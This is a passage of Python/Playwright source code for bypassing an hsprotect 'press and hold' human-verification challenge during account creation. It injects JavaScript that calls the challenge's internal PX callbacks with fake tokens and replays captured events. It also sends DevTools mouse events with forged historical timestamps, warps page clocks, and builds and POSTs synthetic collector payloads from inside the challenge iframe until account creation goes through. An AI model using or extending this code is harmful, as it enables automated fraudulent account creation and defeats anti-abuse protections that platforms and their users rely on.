    time_warp_hold_ms=11800,
    time_warp_wall_ms=180,
    time_warp_stop_delay_ms=350,
    time_warp_install_mode="early",
    time_warp_clock_mode="full",
    normalize_px1200_timing="auto",
    px1200_timing_profile="default",
    replace_px561_from_px1200=False,
    align_px561_timing_from_px1200=False,
    inject_knp_sandbox_event=False,
    exact_knp_wait_ms=0,
    exact_knp_fallback_grace_ms=0,
    synthetic_u0_enabled=True,
    synthetic_u0_lead_ms=0,
    preserve_final_bfa=False,
    early_w0_drain_before_final_ms=-1,
    early_w0_drain_after_final_ms=160,
    delayed_final_hard_extra_ms=3000,
):
    functions = [x for x in (functions or []) if x]
    if mode in ("time_warp_hold", "chctx_score_probe_hooked"):
        if normalize_px1200_timing == "auto":
            normalize_timing = (time_warp_clock_mode == "full") and not (
                replace_px561_from_px1200 or align_px561_timing_from_px1200
            )
        else:
            normalize_timing = normalize_px1200_timing == "on"
        spec = {
            "enabled": False,
            "timeWarp": time_warp_install_mode != "late",
            "lateTimeWarp": time_warp_install_mode == "late",
            "timeWarpAutoStart": False,
            "timeWarpHoldMs": time_warp_hold_ms,
            "timeWarpWallMs": time_warp_wall_ms,
            "timeWarpStopDelayMs": time_warp_stop_delay_ms,
            "timeWarpClockMode": time_warp_clock_mode,
            "normalizePx1200Timing": normalize_timing,
            "normalizePx1200HoldMs": time_warp_hold_ms,
            "px1200TimingProfile": str(px1200_timing_profile or "default"),
            "replacePx561FromPx1200": bool(replace_px561_from_px1200),
            "alignPx561TimingFromPx1200": bool(align_px561_timing_from_px1200),
            "injectKnpSandboxEvent": bool(inject_knp_sandbox_event),
            "knpFinalOnly": True,
            "knpPrestartOnChallenge": True,
            "knpFallbackLast": False,
            "exactKnpWaitMs": int(exact_knp_wait_ms or 0) if inject_knp_sandbox_event else 0,
            "exactKnpFallbackGraceMs": int(exact_knp_fallback_grace_ms or 0) if inject_knp_sandbox_event else 0,
            "syntheticU0Enabled": bool(synthetic_u0_enabled),
            "syntheticU0LeadMs": int(synthetic_u0_lead_ms or 0) if inject_knp_sandbox_event else 0,
            "preserveFinalBfa": bool(preserve_final_bfa),
            "earlyW0DrainBeforeFinalMs": int(early_w0_drain_before_final_ms),
            "earlyW0DrainAfterFinalMs": int(early_w0_drain_after_final_ms or 0),
            "delayedFinalHardExtraMs": int(delayed_final_hard_extra_ms or 0),
            "knpBrokerRetryMs": 2400,
            "replacePx561MaxAgeMs": 6000,
        }
        print(
            "[Probe] auto_actions: "
            f"timeWarp={spec['timeWarp']} lateTimeWarp={spec['lateTimeWarp']} "
            f"holdMs={time_warp_hold_ms} wallMs={time_warp_wall_ms} "
            f"stopDelayMs={time_warp_stop_delay_ms} "
            f"clockMode={time_warp_clock_mode} normalize={normalize_timing} "
            f"pxProfile={spec['px1200TimingProfile']} "
            f"replacePx561={bool(replace_px561_from_px1200)} "
            f"alignPx561={bool(align_px561_timing_from_px1200)} "
            f"injectKnp={bool(inject_knp_sandbox_event)} "
            f"exactKnpWaitMs={spec['exactKnpWaitMs']} "
            f"fallbackGraceMs={spec['exactKnpFallbackGraceMs']} "
            f"syntheticU0={spec['syntheticU0Enabled']} "
            f"u0LeadMs={spec['syntheticU0LeadMs']} "
            f"w0BeforeFinalMs={spec['earlyW0DrainBeforeFinalMs']} "
            f"w0AfterFinalMs={spec['earlyW0DrainAfterFinalMs']} "
            f"hardExtraMs={spec['delayedFinalHardExtraMs']}"
        )
        return spec

    if mode not in {"fake_callback", "replay_px1200", "synthetic_px1200"}:
        return {"enabled": False}

    replay_calls = []
    if replay_path:
        replay_calls = extract_api_calls(replay_path, {"PX1200", "PX764"}, max_replay_events)
    replay_px1200 = [c["args"] for c in replay_calls if c.get("name") == "PX1200"]
    replay_px764 = [c["args"] for c in replay_calls if c.get("name") == "PX764" and c.get("args") and str(c["args"][0]) == "0"]

    if mode == "replay_px1200":
        functions = ["PX1200"]
    if mode == "synthetic_px1200":
        functions = ["PX1200"]
    if not functions:
        functions = ["PX1200"] if replay_px1200 else ["PX764"]

    spec = {
        "enabled": True,
        "functions": functions,
        "once": True,
        "delayMs": 180,
        "replayPx1200": replay_px1200,
        "px764Args": replay_px764[-1] if replay_px764 else ["0", None, None, None],
        "syntheticPx1200": mode == "synthetic_px1200",
        "syntheticTemplate": replay_px1200[-1] if replay_px1200 else None,
        "syntheticHoldMs": synthetic_hold_ms,
    }
    print(
        "[Probe] auto_actions: "
        f"functions={functions} replayPx1200={len(replay_px1200)} "
        f"px764={'captured' if replay_px764 else 'local-null'} "
        f"synthetic={spec['syntheticPx1200']}"
    )
    return spec


def protocol_fake_callback(page, out_dir, email, mode, functions, wait_before_ms, wait_after_ms, replay_path=None):
    print("[Probe] fake_callback: waiting for hsprotect API namespace")
    wait_challenge_state(page, timeout_ms=wait_before_ms)
    wait_for_px_api(page, wanted=functions, timeout_ms=wait_before_ms)
    before_path, before_data = save_probe_state(page, out_dir, email, mode, "before_fake")
    print(f"[Probe] saved before_fake: {before_path}")
    summarize_probe(before_data)

    token = "probe-token-" + str(int(time.time() * 1000))
    replay_calls = extract_api_calls(replay_path, {"PX1200", "PX764"}) if replay_path else []
    replay_px1200 = [c["args"] for c in replay_calls if c.get("name") == "PX1200"]
    replay_px764 = [c["args"] for c in replay_calls if c.get("name") == "PX764" and c.get("args") and str(c["args"][0]) == "0"]
    px764_args = replay_px764[-1] if replay_px764 else ["0", None, None, None]
    print(f"[Probe] fake plan: replay_px1200={len(replay_px1200)} px764_args={'yes' if px764_args else 'no'}")
    attempts = []
    for frame in page.frames:
        try:
            res = frame.evaluate(
                """({token, functions, replayPx1200, px764Args}) => {
                    const ownStringKeys = obj => {
                      try { return Reflect.ownKeys(obj).filter(k => typeof k === 'string'); } catch (_) {}
                      try { return Object.getOwnPropertyNames(obj); } catch (_) {}
                      return [];
                    };
                    const pxFunctionKeys = obj => {
                      try { return ownStringKeys(obj).filter(k => /^PX\\d+$/.test(k) && typeof obj[k] === 'function'); } catch (_) {}
                      return [];
                    };
                    const namespaces = [];
                    const seen = new Set();
                    for (const ns of ownStringKeys(window)) {
                      let obj = null;
                      try { obj = window[ns]; } catch (_) { continue; }
                      if (!obj || (typeof obj !== 'object' && typeof obj !== 'function')) continue;
                      if (/^_?PX/i.test(ns) || ns === 'PX' || /PXzC5j78di/i.test(ns) || pxFunctionKeys(obj).length) {
                        if (!seen.has(ns)) {
                          seen.add(ns);
                          namespaces.push(ns);
                        }
                      }
                    }
                    if (pxFunctionKeys(window).length) namespaces.push('__window__');
                    const out = [];
                    for (const ns of namespaces) {
                      const obj = ns === '__window__' ? window : window[ns];
                      for (const name of functions) {
                        if (typeof obj[name] !== 'function') continue;
                        if (name === 'PX1200' && replayPx1200 && replayPx1200.length) {
                          for (const args of replayPx1200) {
                            try {
                              obj[name].apply(obj, args);
                              out.push({ns, name, mode: 'replay', ok: true});
                            } catch (e) {
                              out.push({ns, name, mode: 'replay', ok: false, error: String(e && e.message || e)});
                            }
                          }
                          continue;
                        }
                        if (name === 'PX764') {
                          try {
                            obj[name].apply(obj, px764Args || ['0', null, null, null]);
                            out.push({ns, name, mode: 'status0', ok: true, argsPreview: JSON.stringify(px764Args || []).slice(0, 220)});
                          } catch (e) {
                            out.push({ns, name, mode: 'status0', ok: false, error: String(e && e.message || e)});
                          }
                          continue;
                        }
                        try {
                          obj[name](token, false);
                          out.push({ns, name, mode: 'token_false', ok: true});
                        } catch (e) {
                          out.push({ns, name, mode: 'token_false', ok: false, error: String(e && e.message || e)});
                        }
                      }
                    }
                    return { href: location.href, namespaces, attempts: out };
                }""",
                {"token": token, "functions": functions, "replayPx1200": replay_px1200, "px764Args": px764_args},
            )
            attempts.append({"frame_url": frame.url, "result": res})
        except Exception as exc:
            attempts.append({"frame_url": getattr(frame, "url", ""), "error": repr(exc)})

    print("[Probe] fake attempts:")
    print(json.dumps(attempts, ensure_ascii=False, indent=2)[:4000])
    page.wait_for_timeout(wait_after_ms)

    after_path, after_data = save_probe_state(page, out_dir, email, mode, "after_fake")
    print(f"[Probe] saved after_fake: {after_path}")
    summarize_probe(after_data)

    try:
        cleared = page.locator('iframe[title="验证质询"]').count() == 0 and page.locator('iframe#enforcementFrame').count() == 0
    except Exception:
        cleared = False
    print(f"[Probe] fake_callback cleared={cleared}")
    return cleared


def protocol_wait_auto_invoke(controller, page, out_dir, email, mode, wait_before_ms, wait_after_ms):
    print(f"[Probe] {mode}: waiting for challenge and hook auto-invoke")
    wait_challenge_state(page, timeout_ms=wait_before_ms)
    page.wait_for_timeout(2500)
    before_path, before_data = save_probe_state(page, out_dir, email, mode, "before_wait")
    print(f"[Probe] saved before_wait: {before_path}")
    summarize_probe(before_data)

    deadline = time.time() + max(1000, wait_after_ms) / 1000
    last_state = None
    while time.time() < deadline:
        try:
            state = controller._captcha_finished_or_blocked(page)
            last_state = state
            if state == "finished":
                after_path, after_data = save_probe_state(page, out_dir, email, mode, "after_wait")
                print(f"[Probe] saved after_wait: {after_path}")
                summarize_probe(after_data)
                return True
            if state == "blocked":
                return False
            if state == "retry":
                print(f"[Probe] {mode}: challenge requested retry")
                break
        except Exception:
            pass
        page.wait_for_timeout(350)

    after_path, after_data = save_probe_state(page, out_dir, email, mode, "after_wait")
    print(f"[Probe] saved after_wait: {after_path}; last_state={last_state}")
    summarize_probe(after_data)
    return False


def extract_replay_events(path, max_events=None):
    calls = [c.get("args") or [] for c in extract_api_calls(path, {"PX1200"})]
    if max_events:
        calls = calls[:max_events]
    return calls


def protocol_replay_px1200(page, out_dir, email, mode, replay_path, delay_ms, wait_before_ms, wait_after_ms):
    calls = extract_replay_events(replay_path)
    print(f"[Probe] replay_px1200: loaded {len(calls)} PX1200 calls from {replay_path}")
    wait_challenge_state(page, timeout_ms=wait_before_ms)
    wait_for_px_api(page, wanted=["PX1200"], timeout_ms=wait_before_ms)
    before_path, before_data = save_probe_state(page, out_dir, email, mode, "before_replay")
    print(f"[Probe] saved before_replay: {before_path}")
    summarize_probe(before_data)

    sent = 0
    for args in calls:
        ok = False
        for frame in page.frames:
            try:
                res = frame.evaluate(
                    """(args) => {
                      const ownStringKeys = obj => {
                        try { return Reflect.ownKeys(obj).filter(k => typeof k === 'string'); } catch (_) {}
                        try { return Object.getOwnPropertyNames(obj); } catch (_) {}
                        return [];
                      };
                      const pxFunctionKeys = obj => {
                        try { return ownStringKeys(obj).filter(k => /^PX\\d+$/.test(k) && typeof obj[k] === 'function'); } catch (_) {}
                        return [];
                      };
                      const namespaces = [];
                      const seen = new Set();
                      for (const ns of ownStringKeys(window)) {
                        let obj = null;
                        try { obj = window[ns]; } catch (_) { continue; }
                        if (!obj || (typeof obj !== 'object' && typeof obj !== 'function')) continue;
                        if (/^_?PX/i.test(ns) || ns === 'PX' || /PXzC5j78di/i.test(ns) || pxFunctionKeys(obj).length) {
                          if (!seen.has(ns)) {
                            seen.add(ns);
                            namespaces.push(ns);
                          }
                        }
                      }
                      if (pxFunctionKeys(window).length) namespaces.push('__window__');
                      for (const ns of namespaces) {
                        const obj = ns === '__window__' ? window : window[ns];
                        if (typeof obj.PX1200 === 'function') {
                          obj.PX1200.apply(obj, args);
                          return {ok: true, ns, href: location.href};
                        }
                      }
                      return {ok: false, href: location.href};
                    }""",
                    args,
                )
                if res.get("ok"):
                    sent += 1
                    ok = True
                    break
            except Exception:
                continue
        if not ok:
            print(f"[Probe] PX1200 replay failed to find API for args={json.dumps(args, ensure_ascii=False)[:240]}")
        page.wait_for_timeout(delay_ms)

    print(f"[Probe] replayed PX1200 calls sent={sent}/{len(calls)}")
    page.wait_for_timeout(wait_after_ms)
    after_path, after_data = save_probe_state(page, out_dir, email, mode, "after_replay")
    print(f"[Probe] saved after_replay: {after_path}")
    summarize_probe(after_data)
    try:
        cleared = page.locator('iframe[title="验证质询"]').count() == 0 and page.locator('iframe#enforcementFrame').count() == 0
    except Exception:
        cleared = False
    print(f"[Probe] replay_px1200 cleared={cleared}")
    return cleared


def protocol_fast_cdp_hold(
    controller,
    page,
    out_dir,
    email,
    mode,
    wait_before_ms,
    wait_after_ms,
    hold_ms=11800,
    wall_wait_ms=120,
):
    print(f"[Probe] fast_cdp_hold: locating hold button; synthetic hold_ms={hold_ms} wall_wait_ms={wall_wait_ms}")
    locate_budget_ms = max(1000, int(wait_before_ms or 0))
    # Thin protocol takeover can reach the hsprotect shell before the nested
    # real hold button is mounted, especially on slow / congested proxy exits.
    # The old 1s default made these runs fail as no_result0 even though the
    # iframe and captcha.js arrived a few seconds later.  Keep this bounded by
    # the existing real-target wait budget so fast nodes are unchanged while
    # slow nodes get a fair chance to expose the real button/fallback box.
    if int(real_target_wait_ms or 0) > 0:
        locate_budget_ms = max(locate_budget_ms, min(int(real_target_wait_ms or 0), 24000))
    deadline = time.time() + locate_budget_ms / 1000
    target, box = None, None
    while time.time() < deadline:
        try:
            target, box = controller._locate_hold_button(page)
            if box:
                break
        except Exception:
            pass
        page.wait_for_timeout(250)
    if not box:
        print("[Probe] fast_cdp_hold: unable to locate hold button")
        return False

    # Keep the physical press at the proven working point.  More right/down
    # targets produced prettier payload coordinates but failed to trigger
    # PX1200 reliably in live runs.  Payload coordinates are normalized later.
    x = box["x"] + box["width"] * 0.385
    y = box["y"] + box["height"] * 0.56
    print(f"[Probe] fast_cdp_hold target=({x:.1f},{y:.1f}) box={box}")

    try:
        page.bring_to_front()
    except Exception:
        pass

    try:
        cdp = page.context.new_cdp_session(page)
    except Exception as exc:
        print(f"[Probe] fast_cdp_hold: CDP session failed {exc!r}; falling back to page.mouse")
        try:
            page.mouse.move(x, y)
            page.mouse.down()
            # Fallback cannot forge timestamps; keep it short to prove whether
            # wall-clock hold is required.
            page.wait_for_timeout(max(0, int(wall_wait_ms)))
            page.mouse.up()
        except Exception as inner:
            print(f"[Probe] fast_cdp_hold fallback error: {inner!r}")
            return False
    else:
        hold_s = max(1000, int(hold_ms)) / 1000.0
        now = time.time()
        down_ts = now - hold_s
        start_ts = down_ts - 0.55
        path = []
        start_x = max(2, min(1360, x - 180))
        start_y = max(2, min(760, y - 90))
        for i in range(8):
            t = i / 7
            px = start_x + (x - start_x) * t + (0.8 if i % 2 else -0.6)
            py = start_y + (y - start_y) * t + (0.5 if i % 2 else -0.4)
            path.append((px, py, start_ts + 0.05 * i))

        def send(evt):
            try:
                cdp.send("Input.dispatchMouseEvent", evt)
            except Exception as exc:
                print(f"[Probe] fast_cdp_hold CDP send error: {exc!r} evt={evt}")
                raise

        try:
            for px, py, ts in path:
                send({"type": "mouseMoved", "x": px, "y": py, "button": "none", "buttons": 0, "timestamp": ts})
            send({"type": "mouseMoved", "x": x, "y": y, "button": "none", "buttons": 0, "timestamp": down_ts - 0.02})
            send({"type": "mousePressed", "x": x, "y": y, "button": "left", "buttons": 1, "clickCount": 1, "timestamp": down_ts})
            if wall_wait_ms and wall_wait_ms > 0:
                page.wait_for_timeout(int(wall_wait_ms))
            # A few pressed moves with historical timestamps populate movement
            # buffers without waiting for the full hold wall-clock duration.
            for frac, dx, dy in [(0.18, 0.3, -0.2), (0.47, -0.4, 0.25), (0.76, 0.15, 0.1)]:
                send({
                    "type": "mouseMoved",
                    "x": x + dx,
                    "y": y + dy,
                    "button": "left",
                    "buttons": 1,
                    "timestamp": down_ts + hold_s * frac,
                })
            send({
                "type": "mouseReleased",
                "x": x + 0.2,
                "y": y - 0.1,
                "button": "left",
                "buttons": 0,
                "clickCount": 1,
                "timestamp": now,
            })
            print("[Probe] fast_cdp_hold: CDP events dispatched")
        except Exception:
            return False

    page.wait_for_timeout(600)
    try:
        path, data_saved = save_probe_state(page, out_dir, email, mode, "after_fast_cdp")
        print(f"[Probe] saved after_fast_cdp: {path}")
        summarize_probe(data_saved)
    except Exception as exc:
        print(f"[Probe] fast_cdp_hold save failed: {exc!r}")

    deadline = time.time() + max(1000, wait_after_ms) / 1000
    while time.time() < deadline:
        try:
            state = controller._captcha_finished_or_blocked(page)
            if state == "finished":
                return True
            if state == "blocked":
                return False
            if state == "retry":
                print("[Probe] fast_cdp_hold: challenge requested retry")
                return False
        except Exception:
            pass
        page.wait_for_timeout(350)
    return False


def _collect_live_knp_from_frames(page, qi: str) -> tuple[dict | None, str, list]:
    """Return (knp, challenge_href, diagnostics) from live runtime-hook state."""
    diagnostics = []
    challenge_href = ""
    best_knp = None
    for idx, frame in enumerate(page.frames):
        try:
            res = frame.evaluate(
                """(qi) => {
                  try {
                    const s = window.__pxProbe || {};
                    const href = String(location.href || "");
                    const byQi = s.knpByQi || {};
                    let knp = byQi && byQi[String(qi || "")] || null;
                    if (!knp && String(s.lastKnpQi || "") === String(qi || "") && s.lastKnpData) knp = s.lastKnpData;
                    return {
                      href,
                      hasKnp: !!knp,
                      knp,
                      lastKnpQi: s.lastKnpQi || "",
                      lastCollectorQi: s.lastCollectorQi || "",
                      lastChallengeQi: s.lastChallengeQi || s.externalChallengeQi || ""
                    };
                  } catch (e) {
                    return { error: String(e && e.message || e), href: String(location.href || "") };
                  }
                }""",
                str(qi or ""),
            )
        except Exception as exc:
            diagnostics.append({"idx": idx, "error": repr(exc)[:160]})
            continue
        href = str((res or {}).get("href") or "")
        if "iframe.hsprotect.net/index.html" in href and "ch_ctx=1" in href and not challenge_href:
            challenge_href = href
        if res and res.get("hasKnp") and isinstance(res.get("knp"), dict) and not best_knp:
            best_knp = res.get("knp")
        diagnostics.append({
            "idx": idx,
            "href": href[:140],
            "hasKnp": bool(res and res.get("hasKnp")),
            "lastKnpQi": (res or {}).get("lastKnpQi"),
            "lastCollectorQi": (res or {}).get("lastCollectorQi"),
            "lastChallengeQi": (res or {}).get("lastChallengeQi"),
        })
    if not challenge_href:
        for item in diagnostics:
            href = str(item.get("href") or "")
            if "iframe.hsprotect.net/index.html" in href:
                challenge_href = href
                break
    return best_knp, challenge_href, diagnostics


def force_synthetic_final_probe(
    controller,
    page,
    template_network=None,
    preserve_bfa=False,
    trigger_success_signals=False,
    wait_after_ms=15000,
    force_no_u0=False,
):
    """
    Last-resort protocol probe for the restarted 1s route.

    If a very short accelerated hold never causes hsprotect to emit PX561, build
    U0 + final collector bodies from the current Y1NZ form, exact live KNP, and
    a known accepted current-success PX561 envelope.  Send the requests from the
    live challenge iframe so cookies/CORS match the target context.
    """
    try:
        from analyze_protocol_run import _decode_collector_response
        from synthesize_protocol_final_body import (
            apply_current_common,
            find_template_final,
            make_u0_from_final,
            replace_payload_and_pc,
            set_form_field,
            shift_epoch_like_values,
            summarize_body,
        )
    except Exception as exc:
        print(f"[Probe] force synthetic final unavailable: import failed {exc!r}")
        return False

    capture_state = getattr(page, "_pxprobe_collector_capture", None) or {}
    items = list(capture_state.get("items") or [])
    y1_items = [
        item for item in items
        if item.get("body") and "Y1NZWSUzXWs=" in ",".join(item.get("tags") or [])
        and str(item.get("qi") or "") != "1604064986000"
    ]
    if not y1_items:
        print("[Probe] force synthetic final skipped: no captured current Y1NZ")
        return False
    target = y1_items[-1]
    target_body = target.get("body") or ""
    target_url = target.get("url") or "https://collector-pxzc5j78di.hsprotect.net/assets/js/bundle"
    target_form = parse_form_preserve_payload(target_body)
    target_meta = decode_payload_meta_from_form(target_form)
    target_qi = str(target_meta.get("qi") or target.get("qi") or "")
    if not target_qi or target_qi == "1604064986000":
        print(f"[Probe] force synthetic final skipped: bad qi={target_qi!r}")
        return False
    same_qi_items = [
        item for item in items
        if str(item.get("qi") or "") == target_qi and item.get("body")
    ]
    seen_u0 = any("U0MpSRYiJH8=" in ",".join(item.get("tags") or []) for item in same_qi_items)
    seen_final = any("PX561" in ",".join(item.get("tags") or []) for item in same_qi_items)
    max_seq = 1
    max_rsc = 2
    for item in same_qi_items:
        try:
            max_seq = max(max_seq, int(item.get("seq") or 0))
        except Exception:
            pass
        try:
            max_rsc = max(max_rsc, int(item.get("rsc") or 0))
        except Exception:
            pass
    send_u0 = (not force_no_u0) and not seen_u0
    u0_seq = max_seq + 1
    u0_rsc = max_rsc + 1
    final_seq = u0_seq + 1 if send_u0 else max_seq + 1
    final_rsc = u0_rsc + 1 if send_u0 else max_rsc + 1

    live_knp, challenge_href, knp_diag = _collect_live_knp_from_frames(page, target_qi)
    print(
        "[Probe] force synthetic final context "
        f"qi={target_qi} url={target_url} liveKnp={bool(live_knp)} "
        f"seenU0={seen_u0} forceNoU0={bool(force_no_u0)} seenFinal={seen_final} "
        f"seq={u0_seq if send_u0 else '-'}->{final_seq} "
        f"challengeHref={challenge_href[:100]} frames={len(knp_diag)}"
    )
    if not live_knp:
        print("[Probe] force synthetic final skipped: no exact live KNP in runtime frames")
        return False

    template_path = Path(template_network) if template_network else Path("Results/network/20260704_200613_vde2anwfdvoerk.jsonl")
    if not template_path.exists():
        print(f"[Probe] force synthetic final skipped: missing template {template_path}")
        return False
    try:
        template_final, _template_u0, _template_w0 = find_template_final(template_path)
        _t_idx, _t_event, _t_form, t_meta, _t_tags = template_final
        template_qi = str(t_meta.get("qi") or "")
        final_events = [
            json.loads(json.dumps(ev, ensure_ascii=False))
            for ev in (t_meta.get("events") or [])
            if isinstance(ev, dict)
            and ev.get("t") in {"aRVTHy91Wio=", "KnpQcG8ZVUI=", "PX561", "JDBeOmJSWwo=", "BFA+GkExMiE="}
            and (preserve_bfa or ev.get("t") != "BFA+GkExMiE=")
        ]
        shift_epoch_like_values(final_events, template_qi, target_qi)
        apply_current_common(final_events, target_form, target_qi, live_knp, challenge_href)
        u0_event = make_u0_from_final(final_events)
        if not u0_event:
            print("[Probe] force synthetic final skipped: failed to make U0")
            return False
        u0_body, _u0_enc = replace_payload_and_pc(target_body, target_form, [u0_event])
        u0_body = set_form_field(set_form_field(u0_body, "seq", u0_seq), "rsc", u0_rsc)
        final_body, _final_enc = replace_payload_and_pc(target_body, target_form, final_events)
        final_body = set_form_field(set_form_field(final_body, "seq", final_seq), "rsc", final_rsc)
        final_body = set_form_field(final_body, "pxprobe_force", 1)
        if send_u0:
            print("[Probe] force synthetic final u0=" + json.dumps(summarize_body(u0_body), ensure_ascii=False)[:500])
        else:
            skip_reason = "forceNoU0" if force_no_u0 else "live U0 already observed"
            print(f"[Probe] force synthetic final u0=skipped ({skip_reason})")
        print("[Probe] force synthetic final final=" + json.dumps(summarize_body(final_body), ensure_ascii=False)[:1200])
    except Exception as exc:
        print(f"[Probe] force synthetic final build failed: {exc!r}")
        return False

    send_result = None
    send_errors = []
    send_candidates = []
    for idx, frame in enumerate(page.frames):
        try:
            href = str(getattr(frame, "url", "") or "")
            send_candidates.append({"idx": idx, "url": href[:180]})
            is_hsprotect_frame = "iframe.hsprotect.net/index.html" in href
            is_exact_challenge = bool(challenge_href and href == challenge_href)
            if not is_hsprotect_frame and not is_exact_challenge:
                continue
            send_result = frame.evaluate(
                """async ({url, u0Body, finalBody}) => {
                  const out = { href: String(location.href || ""), u0: null, final: null };
                  async function post(body) {
                    const resp = await fetch(url, {
                      method: "POST",
                      credentials: "include",
                      mode: "cors",
                      keepalive: true,
                      headers: { "content-type": "application/x-www-form-urlencoded" },
                      body
                    });
                    let text = "";
                    try { text = await resp.text(); } catch (_) {}
                    return { status: resp.status, ok: resp.ok, text: text.slice(0, 5000), len: text.length };
                  }
                  if (u0Body) {
                    out.u0 = await post(u0Body);
                    await new Promise(resolve => setTimeout(resolve, 180));
                  }
                  out.final = await post(finalBody);
                  return out;
                }""",
                {"url": target_url, "u0Body": (u0_body if send_u0 else None), "finalBody": final_body},
            )
            print(f"[Probe] force synthetic final sent via frame[{idx}] {href[:120]}")
            break
        except Exception as exc:
            send_errors.append({"idx": idx, "url": (getattr(frame, "url", "") or "")[:140], "error": repr(exc)[:180]})
    if not send_result:
        print("[Probe] force synthetic final send failed: " + json.dumps({
            "errors": send_errors[-5:],
            "candidates": send_candidates[-12:],
        }, ensure_ascii=False)[:1800])
        return False

    print("[Probe] force synthetic final response=" + json.dumps({
        "href": (send_result or {}).get("href"),
        "u0": {k: ((send_result.get("u0") or {}).get(k)) for k in ("status", "ok", "len")},
        "final": {k: ((send_result.get("final") or {}).get(k)) for k in ("status", "ok", "len")},
    }, ensure_ascii=False))
    final_decoded = {}
    try:
        final_text = ((send_result or {}).get("final") or {}).get("text") or ""
        final_decoded = _decode_collector_response(final_text, final_body) or {}
        print("[Probe] force synthetic final decoded=" + json.dumps(final_decoded, ensure_ascii=False)[:1200])
    except Exception as exc:
        print(f"[Probe] force synthetic final response decode failed: {exc!r}")

    result0 = any(str(x).endswith("|0") for x in (final_decoded.get("results") or []))
    if result0 and trigger_success_signals:
        _trigger_hsprotect_success_signals(page, qi=target_qi, reason="force_synthetic_final_result0")

    deadline = time.time() + max(1000, int(wait_after_ms or 0)) / 1000
    while time.time() < deadline:
        try:
            account_state = controller.get_create_account_state(page)
            if account_state.get("create_success") or int(account_state.get("create_requests") or 0) > 0:
                print(f"[Probe] force synthetic final: CreateAccount observed state={account_state}")
                return True
        except Exception:
            pass
        try:
            state = controller._captcha_finished_or_blocked(page)
            if state == "finished":
                print("[Probe] force synthetic final: challenge iframe finished after forced send")
                return True
            if state == "blocked":
                return False
        except Exception:
            pass
        page.wait_for_timeout(350)
    return False


def protocol_time_warp_hold(
    controller,
    page,
    out_dir,
    email,
    mode,
    wait_before_ms,
    wait_after_ms,
    hold_ms=11800,
    wall_ms=180,
    stop_delay_ms=350,
    prewait_ms=0,
    pre_down_dwell_ms=0,
    frame_scope="challenge",
    install_mode="early",
    skip_mid_snapshots=False,
    attempts=1,
    runtime_hook_js=None,
    install_runtime_hook_late=False,
    retry_visible_challenge_after_ms=0,
    finished_stable_ms=1800,
    abort_on_score1=False,
    legacy_short_hold_input=False,
    dense_cdp_hold_input=False,
    hybrid_legacy_down_cdp_move_up=False,
    hybrid_legacy_down_cdp_move_legacy_up=False,
    hybrid_page_move_count=0,
    legacy_short_hold_steps=0,
    async_raw_cdp_release_ms=0,
    raw_cdp_endpoint=None,
    hybrid_page_move_for_click=False,
    hybrid_page_move_no_reply=False,
    async_raw_cdp_release_no_wait=False,
    oopif_cdp_hold_input=False,
    oopif_cdp_no_wait=False,
    native_sendinput_hold_input=False,
    min_runtime_hook_ready_frames=0,
    min_knp_prestart_ok=0,
    require_chctx_runtime_ready=False,
    prehold_hook_guard_retries=2,
    force_synthetic_final_on_timeout=False,
    force_synthetic_final_template_network=None,
    force_synthetic_final_preserve_bfa=False,
    force_synthetic_final_trigger_signals=False,
    force_synthetic_final_after_hold_ms=-1,
    force_synthetic_final_no_u0=False,
    captcha_close_grace_ms=0,
    prehold_readiness_gate_ms=0,
    prehold_loaded_min_age_ms=0,
    real_target_wait_ms=12000,
):
    def frame_in_scope(frame_url):
        if frame_scope != "challenge":
            return True
        return frame_url == "about:blank" or "hsprotect.net" in frame_url

    runtime_active_qi_hint = ""

    def choose_runtime_active_qi(results):
        counts = {}
        for item in results or []:
            try:
                if not item.get("isChctx"):
                    continue
                if not item.get("installed") or not item.get("hasKnpPrestart"):
                    continue
                qi = str(item.get("hintedQi") or "")
                if not qi or qi == "1604064986000":
                    continue
                counts[qi] = counts.get(qi, 0) + 1
            except Exception:
                continue
        if not counts:
            return ""
        return sorted(counts.items(), key=lambda kv: (-kv[1], kv[0]))[0][0]

    def install_late_time_warp():
        results = []
        failures = []
        for idx, frame in enumerate(page.frames):
            try:
                frame_url = frame.url or ""
                if not frame_in_scope(frame_url):
                    continue
                res = frame.evaluate(LATE_TIME_WARP_JS)
                results.append({"idx": idx, "href": frame_url[:100], "res": res})
            except Exception as exc:
                failures.append({"idx": idx, "href": (getattr(frame, "url", "") or "")[:100], "error": repr(exc)[:160]})
        print(f"[Probe] late_time_warp install: frames={len(results)} failures={len(failures)}")
        for item in results[:8]:
            print(f"  late frame[{item['idx']}] {item['href']}")
        for item in failures[:5]:
            print(f"  late miss frame[{item['idx']}] {item.get('href')} error={item.get('error')}")
        return results

    def score1_detected(active_qi: str = ""):
        if not abort_on_score1:
            return None
        try:
            capture_state = getattr(page, "_pxprobe_collector_capture", None) or {}
            if not active_qi and isinstance(capture_state, dict):
                try:
                    active_qi = str(((capture_state.get("last") or {}).get("qi")) or "")
                except Exception:
                    active_qi = ""
            responses = list((capture_state.get("responses") if isinstance(capture_state, dict) else []) or [])
            for resp in reversed(responses[-12:]):
                try:
                    scores = [str(x) for x in (resp.get("scores") or [])]
                    if not any(x.startswith("IoIoIo|score|1|") for x in scores):
                        continue
                    qi = str(resp.get("qi") or "")
                    # The fixed bootstrap qi can emit noisy baseline scores.
                    # Abort only once the live challenge qi itself has scored.
                    if not qi or qi == "1604064986000":
                        continue
                    if active_qi and qi != active_qi:
                        continue
                    return {
                        "source": "collector_capture",
                        "qi": qi,
                        "active_qi": active_qi,
                        "seq": str(resp.get("seq") or ""),
                        "rsc": str(resp.get("rsc") or ""),
                        "status": resp.get("status"),
                        "scores": scores[:3],
                    }
                except Exception:
                    continue
        except Exception:
            pass
        if active_qi:
            return None
        for idx, frame in enumerate(page.frames):
            try:
                frame_url = frame.url or ""
                if not frame_in_scope(frame_url):
                    continue
                res = frame.evaluate(
                    """() => {
                      try {
                        const d = window.__pxProbeScore1Detected || null;
                        if (!d) return null;
                        return {href: location.href, t: d.t || 0, perf: d.perf || 0, url: String(d.url || '').slice(0, 160)};
                      } catch (_) { return null; }
                    }"""
                )
                if res:
                    return {"idx": idx, **res}
            except Exception:
                continue
        return None

    def broadcast_time_warp(action):
        results = []
        failures = []
        for idx, frame in enumerate(page.frames):
            try:
                frame_url = frame.url or ""
                if not frame_in_scope(frame_url):
                    continue
                res = frame.evaluate(
                    """({action, holdMs, wallMs, stopDelayMs}) => {
                      try {
                        let direct = false;
                        if (action === "start" && typeof window.__pxProbeTimeWarpStart === "function") {
                          window.__pxProbeTimeWarpStart("direct_start", holdMs, wallMs);
                          direct = true;
